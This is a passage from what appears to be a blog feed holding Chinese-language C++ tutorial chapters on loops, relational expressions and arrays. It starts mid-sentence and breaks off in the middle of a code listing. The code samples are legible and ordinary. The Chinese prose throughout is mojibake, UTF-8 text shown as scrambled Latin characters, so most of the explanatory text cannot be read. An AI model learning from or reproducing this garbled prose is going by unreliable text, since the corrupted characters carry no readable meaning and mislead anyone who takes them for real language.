è¿ç»­å­˜å‚¨ï¼Œç„¶åæ˜¯ç¬¬äºŒè¡Œçš„æ‰€æœ‰å…ƒç´ ï¼Œä¾æ­¤ç±»æ¨ã€‚ä¾‹å¦‚ï¼Œ<code>matrix[3][4]</code> çš„å†…å­˜å¸ƒå±€çœ‹èµ·æ¥åƒï¼š<br><code>matrix[0][0], matrix[0][1], matrix[0][2], matrix[0][3], matrix[1][0], matrix[1][1], ... , matrix[2][3]</code></p><p>ç†è§£è¿™ä¸€ç‚¹å¯¹äºå°†äºŒç»´æ•°ç»„ä¼ é€’ç»™å‡½æ•°ï¼ˆé€šå¸¸éœ€è¦çŸ¥é“åˆ—æ•°ï¼‰æˆ–è¿›è¡ŒæŸäº›æŒ‡é’ˆæ“ä½œå¾ˆé‡è¦ã€‚</p><h2 id="5-7-æ€»ç»“"><a href="#5-7-æ€»ç»“" class="headerlink" title="5.7 æ€»ç»“"></a>5.7 æ€»ç»“</h2><p>æœ¬ç« é‡ç‚¹ä»‹ç»äº†C++ä¸­çš„<strong>å¾ªç¯ç»“æ„</strong>å’Œ<strong>å…³ç³»è¡¨è¾¾å¼</strong>ï¼Œå®ƒä»¬æ˜¯æ§åˆ¶ç¨‹åºæµç¨‹å’Œå¤„ç†é‡å¤ä»»åŠ¡çš„åŸºç¡€ã€‚</p><p>æˆ‘ä»¬å­¦ä¹ äº†ä¸‰ç§ä¸»è¦çš„å¾ªç¯è¯­å¥ï¼š</p><ol><li> <strong><code>for</code> å¾ªç¯:</strong> è¿™æ˜¯ä¸€ç§å…¥å£æ¡ä»¶å¾ªç¯ï¼Œå…¶å¤´éƒ¨åŒ…å«äº†åˆå§‹åŒ–ã€æµ‹è¯•æ¡ä»¶å’Œæ›´æ–°ä¸‰ä¸ªéƒ¨åˆ†ï¼Œç»“æ„æ¸…æ™°ï¼Œç‰¹åˆ«é€‚ç”¨äºè®¡æ•°æˆ–å·²çŸ¥è¿­ä»£æ¬¡æ•°çš„æƒ…å†µã€‚æˆ‘ä»¬æ¢è®¨äº†å…¶ç»„æˆéƒ¨åˆ†ã€å¦‚ä½•ä¿®æ”¹æ­¥é•¿ã€ä½¿ç”¨å®ƒè®¿é—®å­—ç¬¦ä¸²ï¼ˆCé£æ ¼å’Œ<code>std::string</code>ï¼‰ï¼Œå¹¶è¯¦ç»†å­¦ä¹ äº†é€’å¢ (<code>++</code>) å’Œé€’å‡ (<code>--</code>) è¿ç®—ç¬¦ï¼ˆåŒ…æ‹¬å‰ç¼€å’Œåç¼€å½¢å¼åŠå…¶åŒºåˆ«ã€å‰¯ä½œç”¨å’Œé¡ºåºç‚¹é—®é¢˜ã€åœ¨æŒ‡é’ˆä¸Šçš„åº”ç”¨ï¼‰ã€‚æ­¤å¤–ï¼Œè¿˜ä»‹ç»äº†ç»„åˆèµ‹å€¼è¿ç®—ç¬¦ï¼ˆå¦‚ <code>+=</code>, <code>-=</code>ï¼‰å’Œé€—å·è¿ç®—ç¬¦åœ¨ <code>for</code> å¾ªç¯ä¸­çš„åº”ç”¨ã€‚</li><li> <strong><code>while</code> å¾ªç¯:</strong> è¿™ä¹Ÿæ˜¯ä¸€ç§å…¥å£æ¡ä»¶å¾ªç¯ï¼Œä½†ç»“æ„æ›´ç®€å•ï¼ŒåªåŒ…å«ä¸€ä¸ªæµ‹è¯•æ¡ä»¶ã€‚å®ƒé€‚ç”¨äºå¾ªç¯æ¬¡æ•°ä¸ç¡®å®šã€ä¾èµ–äºæŸä¸ªæ¡ä»¶æŒç»­æ»¡è¶³çš„æƒ…å†µã€‚æˆ‘ä»¬æ¯”è¾ƒäº† <code>for</code> å’Œ <code>while</code> çš„é€‚ç”¨åœºæ™¯ï¼Œå¹¶äº†è§£äº†å¦‚ä½•ä½¿ç”¨å¾ªç¯ï¼ˆè™½ç„¶ä¸æ¨èï¼‰ä»¥åŠç°ä»£ C++ çš„ <code>&lt;chrono&gt;</code> å’Œ <code>&lt;thread&gt;</code> åº“æ¥å®ç°å»¶æ—¶ã€‚</li><li> <strong><code>do while</code> å¾ªç¯:</strong> è¿™æ˜¯ä¸€ç§å‡ºå£æ¡ä»¶å¾ªç¯ï¼Œå…¶ç‰¹ç‚¹æ˜¯å¾ªç¯ä½“è‡³å°‘æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶ååœ¨æ¯æ¬¡è¿­ä»£ç»“æŸæ—¶æ£€æŸ¥æ¡ä»¶ã€‚å®ƒé€‚ç”¨äºéœ€è¦ç¡®ä¿æ“ä½œè‡³å°‘å‘ç”Ÿä¸€æ¬¡çš„åœºæ™¯ï¼Œå¦‚ç”¨æˆ·è¾“å…¥éªŒè¯ã€‚</li></ol><p>C++11 å¼•å…¥çš„<strong>åŸºäºèŒƒå›´çš„ <code>for</code> å¾ªç¯</strong>æä¾›äº†ä¸€ç§æ›´ç®€æ´ã€æ›´å®‰å…¨çš„éå†åºåˆ—ï¼ˆå¦‚æ•°ç»„ã€<code>vector</code>ã€<code>string</code>ã€åˆå§‹åŒ–åˆ—è¡¨ï¼‰ä¸­æ‰€æœ‰å…ƒç´ çš„æ–¹å¼ã€‚æˆ‘ä»¬å­¦ä¹ äº†å…¶è¯­æ³•ã€å¦‚ä½•ä½¿ç”¨ <code>auto</code>ã€å¼•ç”¨ (<code>&amp;</code>) å’Œå¸¸é‡å¼•ç”¨ (<code>const &amp;</code>) æ¥å£°æ˜å¾ªç¯å˜é‡ï¼Œä»¥åŠå®ƒçš„ä¼˜ç‚¹å’Œå±€é™æ€§ï¼ˆå¦‚æ— æ³•ç›´æ¥è·å–ç´¢å¼•ï¼‰ã€‚</p><p><strong>å…³ç³»è¡¨è¾¾å¼</strong>ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ï¼ˆ<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>==</code>, <code>!=</code>ï¼‰æ¥æ¯”è¾ƒå€¼ï¼Œç»“æœä¸ºå¸ƒå°”å€¼ <code>true</code> æˆ– <code>false</code>ï¼Œå¸¸ç”¨äºå¾ªç¯å’Œåˆ†æ”¯è¯­å¥çš„æ¡ä»¶åˆ¤æ–­ã€‚æˆ‘ä»¬ç‰¹åˆ«å¼ºè°ƒäº†å°†èµ‹å€¼è¿ç®—ç¬¦ (<code>=</code>) è¯¯ç”¨ä¸ºæ¯”è¾ƒè¿ç®—ç¬¦ (<code>==</code>) çš„å¸¸è§é”™è¯¯åŠå…¶åæœã€‚å¯¹äºå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæˆ‘ä»¬äº†è§£åˆ° C é£æ ¼å­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨ <code>&lt;cstring&gt;</code> ä¸­çš„ <code>strcmp()</code> å‡½æ•°æ¥æ¯”è¾ƒå†…å®¹ï¼Œè€Œ <code>std::string</code> ç±»åˆ™å¯ä»¥ç›´æ¥ä½¿ç”¨é‡è½½çš„å…³ç³»è¿ç®—ç¬¦è¿›è¡Œå†…å®¹çš„å­—å…¸åºæ¯”è¾ƒã€‚</p><p>æœ¬ç« è¿˜æ·±å…¥æ¢è®¨äº†<strong>å¾ªç¯ä¸æ–‡æœ¬è¾“å…¥</strong>çš„ç»“åˆã€‚æˆ‘ä»¬åˆ†æäº† <code>cin &gt;&gt;</code> è¯»å–å•è¯ï¼ˆè·³è¿‡å¹¶åœæ­¢äºç©ºç™½ï¼‰çš„è¡Œä¸ºï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨ <code>cin.get(char)</code> å’Œæ— å‚æ•°çš„ <code>cin.get()</code> æ¥é€ä¸ªè¯»å–å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºç™½ç¬¦ï¼‰ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•æ£€æµ‹<strong>æ–‡ä»¶å°¾ (EOF)</strong> æ¡ä»¶ä»¥æ­£ç¡®ç»ˆæ­¢è¾“å…¥å¾ªç¯ï¼ŒåŒ…æ‹¬æ£€æŸ¥ <code>cin</code> æµçŠ¶æ€å’Œ <code>cin.get()</code> çš„è¿”å›å€¼ã€‚æœ€åï¼Œæˆ‘ä»¬äº†è§£äº†è¯»å– C é£æ ¼å­—ç¬¦ä¸²çš„ <code>cin.get(buffer, size)</code> ç‰ˆæœ¬åŠå…¶ä¸ <code>getline</code> çš„åŒºåˆ«ï¼ˆåˆ†éš”ç¬¦å¤„ç†ï¼‰ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬å­¦ä¹ äº†<strong>åµŒå¥—å¾ªç¯</strong>çš„æ¦‚å¿µï¼Œå³ä¸€ä¸ªå¾ªç¯åŒ…å«åœ¨å¦ä¸€ä¸ªå¾ªç¯å†…éƒ¨ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨åµŒå¥—å¾ªç¯æ¥å¤„ç†<strong>äºŒç»´æ•°ç»„</strong>ï¼ˆæ•°ç»„çš„æ•°ç»„ï¼‰ã€‚æˆ‘ä»¬äº†è§£äº†äºŒç»´æ•°ç»„çš„åˆå§‹åŒ–æ–¹æ³•å’Œå¦‚ä½•ä½¿ç”¨åŒé‡ç´¢å¼• <code>[row][col]</code> é…åˆåµŒå¥—å¾ªç¯æ¥è®¿é—®å’Œå¤„ç†å…¶æ‰€æœ‰å…ƒç´ ã€‚</p><p>é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº† C++ ä¸­æ§åˆ¶é‡å¤æ‰§è¡Œå’Œè¿›è¡Œæ¯”è¾ƒçš„æ ¸å¿ƒå·¥å…·ï¼Œä¸ºç¼–å†™æ›´å¤æ‚ã€æ›´å¼ºå¤§çš„ç¨‹åºå¥ å®šäº†åŸºç¡€ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 4 å¤åˆç±»å‹</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_4/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_4/</url>
      
        <content type="html"><![CDATA[<h2 id="4-1-æ•°ç»„"><a href="#4-1-æ•°ç»„" class="headerlink" title="4.1 æ•°ç»„"></a>4.1 æ•°ç»„</h2><p><strong>æ•°ç»„ (Array)</strong> æ˜¯ä¸€ç§<strong>å¤åˆç±»å‹ (Compound Type)**ï¼Œå®ƒå…è®¸ä½ å­˜å‚¨å¤šä¸ª</strong>ç›¸åŒç±»å‹<strong>çš„å€¼ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ç§°ä¸ºä¸€ä¸ª</strong>å…ƒç´  (Element)<strong>ï¼Œå¯ä»¥é€šè¿‡</strong>ç´¢å¼• (Index)** æˆ–<strong>ä¸‹æ ‡ (Subscript)</strong> æ¥è®¿é—®ç‰¹å®šå…ƒç´ ã€‚</p><h3 id="4-1-1-ç¨‹åºè¯´æ˜"><a href="#4-1-1-ç¨‹åºè¯´æ˜" class="headerlink" title="4.1.1 ç¨‹åºè¯´æ˜"></a>4.1.1 ç¨‹åºè¯´æ˜</h3><p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ éœ€è¦å­˜å‚¨ä¸€å¹´ä¸­æ¯ä¸ªæœˆçš„é”€å”®é¢ã€‚ä½ å¯ä»¥å£°æ˜12ä¸ªç‹¬ç«‹çš„ <code>double</code> å˜é‡ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> salesJan, salesFeb, salesMar, <span class="comment">/* ..., */</span> salesDec; </span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•éå¸¸ç¹çï¼Œå°¤å…¶æ˜¯åœ¨éœ€è¦å¤„ç†å¤§é‡æ•°æ®æ—¶ã€‚æ•°ç»„æä¾›äº†ä¸€ç§æ›´ç®€æ´ã€æ›´å¼ºå¤§çš„æ–¹å¼æ¥å¤„ç†è¿™ç§æƒ…å†µã€‚</p><p><strong>æ•°ç»„å£°æ˜:</strong></p><p>å£°æ˜ä¸€ä¸ªæ•°ç»„éœ€è¦æŒ‡å®šï¼š</p><ol><li> <strong>å…ƒç´ ç±»å‹:</strong> æ•°ç»„ä¸­å­˜å‚¨çš„æ•°æ®ç±»å‹ã€‚</li><li> <strong>æ•°ç»„åç§°:</strong> å˜é‡åã€‚</li><li> <strong>æ•°ç»„å¤§å°:</strong> æ•°ç»„å¯ä»¥å®¹çº³çš„å…ƒç´ æ•°é‡ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ª<strong>å¸¸é‡è¡¨è¾¾å¼</strong>ï¼ˆåœ¨ç¼–è¯‘æ—¶å°±èƒ½ç¡®å®šå…¶å€¼çš„è¡¨è¾¾å¼ï¼Œä¾‹å¦‚å­—é¢å¸¸é‡ã€<code>const</code> å¸¸é‡ã€æšä¸¾é‡æˆ– <code>sizeof</code> è¡¨è¾¾å¼çš„ç»“æœï¼‰ï¼Œå¹¶ä¸”å¿…é¡»æ”¾åœ¨æ–¹æ‹¬å· <code>[]</code> å†…ã€‚</li></ol><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[arraySize]; </span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªå¯ä»¥å­˜å‚¨ 12 ä¸ª double ç±»å‹å€¼çš„æ•°ç»„ï¼Œåä¸º monthlySales</span></span><br><span class="line"><span class="keyword">double</span> monthlySales[<span class="number">12</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªå¯ä»¥å­˜å‚¨ 5 ä¸ª int ç±»å‹å€¼çš„æ•°ç»„ï¼Œåä¸º scores</span></span><br><span class="line"><span class="keyword">int</span> scores[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ const å¸¸é‡å®šä¹‰æ•°ç»„å¤§å°</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_STUDENTS = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">int</span> studentGrades[NUM_STUDENTS]; </span><br></pre></td></tr></table></figure><p><strong>è®¿é—®æ•°ç»„å…ƒç´ :</strong></p><p>ä½¿ç”¨æ•°ç»„åå’Œæ–¹æ‹¬å·å†…çš„ç´¢å¼•æ¥è®¿é—®æ•°ç»„å…ƒç´ ã€‚<strong>C++æ•°ç»„çš„ç´¢å¼•ä» 0 å¼€å§‹</strong>ã€‚å¯¹äºå¤§å°ä¸º <code>N</code> çš„æ•°ç»„ï¼Œæœ‰æ•ˆçš„ç´¢å¼•èŒƒå›´æ˜¯ <code>0</code> åˆ° <code>N-1</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¿é—® monthlySales æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  (ä¸€æœˆ)</span></span><br><span class="line">monthlySales[<span class="number">0</span>] = <span class="number">1500.50</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¿é—® monthlySales æ•°ç»„çš„ç¬¬ä¸‰ä¸ªå…ƒç´  (ä¸‰æœˆ)</span></span><br><span class="line">monthlySales[<span class="number">2</span>] = <span class="number">2100.75</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¿é—® scores æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">scores[<span class="number">4</span>] = <span class="number">95</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å– scores æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ </span></span><br><span class="line"><span class="keyword">int</span> secondScore = scores[<span class="number">1</span>]; </span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;March sales: &quot;</span> &lt;&lt; monthlySales[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second score: &quot;</span> &lt;&lt; secondScore &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p><strong>é‡è¦:</strong> C++ ä¸ä¼šè‡ªåŠ¨æ£€æŸ¥æ•°ç»„ç´¢å¼•æ˜¯å¦è¶Šç•Œã€‚è®¿é—® <code>arrayName[N]</code> æˆ– <code>arrayName[-1]</code>ï¼ˆå¯¹äºå¤§å°ä¸º <code>N</code> çš„æ•°ç»„ï¼‰æ˜¯**æœªå®šä¹‰è¡Œä¸º (Undefined Behavior)**ï¼Œå¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒæˆ–æ•°æ®æŸåã€‚ç¨‹åºå‘˜æœ‰è´£ä»»ç¡®ä¿ä½¿ç”¨çš„ç´¢å¼•åœ¨æœ‰æ•ˆèŒƒå›´å†… (<code>0</code> åˆ° <code>arraySize - 1</code>)ã€‚</p><p><strong>æ•°ç»„å¤§å°å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// int dynamicArray[n]; // é”™è¯¯! C++ æ ‡å‡†ä¸å…è®¸ä½¿ç”¨å˜é‡ä½œä¸ºæ•°ç»„å¤§å° (è™½ç„¶æŸäº›ç¼–è¯‘å™¨å¯èƒ½ä½œä¸ºæ‰©å±•æ”¯æŒ)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> staticArray[SIZE]; <span class="comment">// æ­£ç¡®! SIZE æ˜¯ const å¸¸é‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> anotherArray[<span class="number">10</span>]; <span class="comment">// æ­£ç¡®! 10 æ˜¯å­—é¢å¸¸é‡</span></span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦åœ¨è¿è¡Œæ—¶ç¡®å®šæ•°ç»„å¤§å°ï¼Œåº”è¯¥ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆ<code>new</code>ï¼‰æˆ–æ ‡å‡†åº“æä¾›çš„å®¹å™¨ï¼ˆå¦‚ <code>std::vector</code>ï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚å­¦ä¹ ã€‚</p><h3 id="4-1-2-æ•°ç»„çš„åˆå§‹åŒ–è§„åˆ™"><a href="#4-1-2-æ•°ç»„çš„åˆå§‹åŒ–è§„åˆ™" class="headerlink" title="4.1.2 æ•°ç»„çš„åˆå§‹åŒ–è§„åˆ™"></a>4.1.2 æ•°ç»„çš„åˆå§‹åŒ–è§„åˆ™</h3><p>åœ¨å£°æ˜æ•°ç»„æ—¶ï¼Œå¯ä»¥åŒæ—¶å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ã€‚åˆå§‹åŒ–ä½¿ç”¨èŠ±æ‹¬å· <code>&#123;&#125;</code> æ‹¬èµ·æ¥çš„**åˆå§‹åŒ–åˆ—è¡¨ (Initializer List)**ã€‚</p><p><strong>è§„åˆ™:</strong></p><ol><li><strong>å®Œæ•´åˆå§‹åŒ–:</strong> æä¾›ä¸æ•°ç»„å¤§å°ç›¸åŒæ•°é‡çš„åˆå§‹å€¼ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> scores[<span class="number">5</span>] = &#123;<span class="number">90</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">78</span>, <span class="number">88</span>&#125;; <span class="comment">// scores[0]=90, scores[1]=85, ..., scores[4]=88</span></span><br><span class="line"><span class="keyword">double</span> lengths[<span class="number">3</span>] = &#123;<span class="number">1.2</span>, <span class="number">3.4</span>, <span class="number">0.5</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>éƒ¨åˆ†åˆå§‹åŒ–:</strong> å¦‚æœæä¾›çš„åˆå§‹å€¼æ•°é‡<strong>å°‘äº</strong>æ•°ç»„å¤§å°ï¼Œåˆ™<strong>å‰©ä½™çš„å…ƒç´ ä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸º 0</strong>ï¼ˆå¯¹äºæ•°å€¼ç±»å‹ï¼‰æˆ–ç›¸åº”çš„é›¶ç­‰ä»·å€¼ï¼ˆå¯¹äºå…¶ä»–ç±»å‹ï¼Œå¦‚å­—ç¬¦æ•°ç»„çš„ç©ºå­—ç¬¦ <code>\0</code>ï¼‰ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> counts[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// counts[0]=1, counts[1]=2, counts[2]=3</span></span><br><span class="line">                           <span class="comment">// counts[3] åˆ° counts[9] éƒ½è¢«åˆå§‹åŒ–ä¸º 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> readings[<span class="number">5</span>] = &#123;<span class="number">9.8f</span>&#125;; <span class="comment">// readings[0]=9.8f, å…¶ä»–å…ƒç´ ä¸º 0.0f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†æ•°ç»„æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸º 0 çš„å¸¸ç”¨æ–¹æ³•</span></span><br><span class="line"><span class="keyword">int</span> allZeros[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;; </span><br></pre></td></tr></table></figure></li><li><strong>çœç•¥æ•°ç»„å¤§å°:</strong> å¦‚æœåœ¨å£°æ˜æ—¶æä¾›äº†åˆå§‹åŒ–åˆ—è¡¨ï¼Œå¯ä»¥çœç•¥æ–¹æ‹¬å·ä¸­çš„æ•°ç»„å¤§å°ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®åˆå§‹åŒ–åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°é‡è‡ªåŠ¨æ¨æ–­æ•°ç»„å¤§å°ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">short</span> values[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;; <span class="comment">// ç¼–è¯‘å™¨æ¨æ–­æ•°ç»„å¤§å°ä¸º 4</span></span><br><span class="line"><span class="keyword">char</span> message[] = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;; <span class="comment">// å¤§å°ä¸º 6 (åŒ…æ‹¬ç©ºå­—ç¬¦)</span></span><br></pre></td></tr></table></figure></li><li><strong>ä¸å…è®¸åˆå§‹åŒ–åˆ—è¡¨å…ƒç´ è¿‡å¤š:</strong> åˆå§‹åŒ–åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°é‡<strong>ä¸èƒ½è¶…è¿‡</strong>æ•°ç»„å£°æ˜çš„å¤§å°ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int errors[3] = &#123;1, 2, 3, 4&#125;; // é”™è¯¯! åˆå§‹åŒ–åˆ—è¡¨å…ƒç´ è¿‡å¤š</span></span><br></pre></td></tr></table></figure></li><li><strong>æœªåˆå§‹åŒ–æ•°ç»„:</strong> å¦‚æœåœ¨å£°æ˜æ•°ç»„æ—¶æ²¡æœ‰æä¾›åˆå§‹åŒ–åˆ—è¡¨ï¼ˆä»…é€‚ç”¨äºéé™æ€å±€éƒ¨æ•°ç»„ï¼‰ï¼Œåˆ™æ•°ç»„å…ƒç´ çš„å€¼æ˜¯<strong>æœªå®šä¹‰çš„ (indeterminate)**ï¼Œå®ƒä»¬ä¼šåŒ…å«å†…å­˜ä¸­é—ç•™çš„åƒåœ¾å€¼ã€‚</strong>ä½¿ç”¨æœªåˆå§‹åŒ–çš„å˜é‡æ˜¯å¸¸è§çš„é”™è¯¯æ¥æºã€‚** <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> garbage[<span class="number">5</span>]; <span class="comment">// æ•°ç»„å…ƒç´ çš„å€¼æ˜¯æœªå®šä¹‰çš„ (åƒåœ¾å€¼)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; garbage[0]; // é”™è¯¯! ä½¿ç”¨æœªåˆå§‹åŒ–çš„å€¼</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> staticGarbage[<span class="number">5</span>]; <span class="comment">// é™æ€å­˜å‚¨æ•°ç»„ä¼šè¢«é»˜è®¤åˆå§‹åŒ–ä¸º 0</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; staticGarbage[0]; // è¾“å‡º 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <em>(é™æ€å­˜å‚¨æŒç»­æ€§çš„å˜é‡ï¼Œå¦‚å…¨å±€å˜é‡ã€å‘½åç©ºé—´å˜é‡ã€é™æ€å±€éƒ¨å˜é‡ï¼Œä¼šè¢«é»˜è®¤é›¶åˆå§‹åŒ–)</em></li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®Œæ•´åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">int</span> fibonacci[<span class="number">8</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci[5]: &quot;</span> &lt;&lt; fibonacci[<span class="number">5</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éƒ¨åˆ†åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">double</span> data[<span class="number">5</span>] = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[0]: &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[1]: &quot;</span> &lt;&lt; data[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2.2</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[2]: &quot;</span> &lt;&lt; data[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span 